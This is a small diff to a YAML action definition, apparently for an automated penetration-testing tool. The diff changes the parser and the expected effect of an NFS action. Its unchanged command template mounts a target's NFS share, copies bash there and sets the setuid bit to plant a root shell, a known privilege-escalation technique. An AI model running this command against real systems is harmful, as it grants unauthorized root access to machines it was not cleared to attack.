@@ -7,9 +7,9 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: mount -t nfs {target_ip}:/{share} /mnt/nfs && cp /bin/bash /mnt/nfs/rootbash
   && chmod +s /mnt/nfs/rootbash
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- nfs_shares_found
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
